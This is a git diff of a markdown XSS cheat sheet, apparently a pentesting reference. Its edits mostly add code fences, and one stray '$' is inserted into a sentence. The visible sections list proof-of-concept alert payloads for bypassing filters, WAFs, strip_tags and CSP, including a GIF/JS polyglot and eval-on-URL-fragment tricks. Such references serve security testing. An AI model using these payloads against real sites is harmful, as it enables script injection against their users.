@@ -12,7 +12,7 @@ ________________________________________________________________________________
 
 
 ## HTML Injection
-Use when input lands inside an attribute’s value of an HTML tag or outside tag except the 
+Use when input lands inside an attribute’s value$ of an HTML tag or outside tag except the 
 ones described in next case. Prepend a `-->` to payload if input lands in HTML comments.
 ```
 <svg onload=alert(1)>
@@ -84,6 +84,7 @@ Use when there’s multi reflection in the same line of JS code. 1st payload wor
 ## Javascript Context - Placeholder Injection in Template Literal
 Use when input lands inside backticks (``) delimited strings or in template engines.
 ```${alert(1)}```
+
 
 ## Multi Reflection HTML 
 Injection
@@ -360,6 +361,7 @@ Use when alphabetic characters are not allowed. Following is alert(1).
 Use to trick several regular expression (regex) filters. It might be combined with previous 
 alternatives (above). The shortest option `top` can also be replaced by `window`, `parent`, 
 `self` or `this` depending on context.
+```
 (alert)(1)
 a=alert,a(1)
 [1].find(alert)
@@ -368,7 +370,7 @@ top[/al/.source+/ert/.source](1)
 al\u0065rt(1)
 top['al\145rt'](1)
 top[8680439..toString(30)](1)
-
+```
 
 ## Alert Alternative – Write & Writeln
 Use as an alternative to alert, prompt and confirm. If used within a HTML vector it can be used as it is but if it’s a JS injection the full `document.write` form is required. Replace `&` with `%26` and `#` with `%23` in URLs. Write can be replaced by writeln. 
@@ -389,11 +391,13 @@ Use as an alternative to call alert, prompt and confirm. First payload is the pr
 while the second replaces eval with the value of id attribute of vector used. URL must be in 
 one of the following ways, in URL path after PHP extension or in fragment of the URL. Plus 
 sign (+) must be encoded in URLs.
+```
 <svg onload=eval(" ' "+URL)> 
 <svg id=eval onload=top[id](" ' "+URL)>
 PoC URL must contain one of the following:
 => FILE.php/'/alert(1)//?...
 => #'/alert(1)
+```
 
 
 ## Alert Alternative - Eval + URL with Template Literal
@@ -410,37 +414,42 @@ Use to bypass blacklists.
 ## Strip-Tags Based Bypass
 Use when filter strips out anything between a < and > characters like PHP’s strip_tags() 
 function. Inline injection only.
+```
 "o<x>nmouseover=alert<x>(1)//
- "autof<x>ocus o<x>nfocus=alert<x>(1)//
-
+"autof<x>ocus o<x>nfocus=alert<x>(1)//
+```
 
 ## File Upload Injection – HTML/js GIF Disguise
 Use to bypass CSP via file upload. Save all content below as `xss.gif` or `xss.js` (for strict 
 MIME checking). It can be imported to target page with <link rel=import href=xss.gif> (also 
 `xss.js`) or <script src=xss.js></script>. It’s image/gif for PHP. 
+```
 GIF89a=//<script>
 alert(1)//</script>;
-
+```
 
 ## Jump to URL Fragment
 Use when you need to hide some characters from your payload that would trigger a WAF 
 for example. It makes use of respective payload format after URL fragment (#). 
+```
 eval(URL.slice(-8)) #alert(1)
 eval(location.hash.slice(1)) #alert(1)
 document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
-
+```
 
 ## Second Order XSS Injection
 Use when your input will be used twice, like stored normalized in a database and then 
 retrieved for later use or inserted into DOM. 
+```
 &lt;svg/onload&equals;alert(1)&gt;
-
+```
 
 ## PHP Spell Checker Bypass
 Use to bypass PHP’s pspell_new function which provides a dictionary to try to guess the 
 input used to search. A `Did You Mean` Google-like feature for search fields.  
+```
 <scrpt> confirm(1) </scrpt>
-
+```
 
 ## Event Origin Bypass for postMessage() XSS
 Use when a check for origin can be bypassed in javascript code of target by prepending one
@@ -472,7 +481,7 @@ based too. `Set` can also be replaced by `animate`. Use against blacklists.
 <svg><set end=1 onend=alert(1)>
 ```
 
-SVG Vectors without Event Handlers
+## SVG Vectors without Event Handlers
 Use to avoid filters looking for event handlers or src, data, etc. Last one is Firefox only, 
 already URL encoded
 
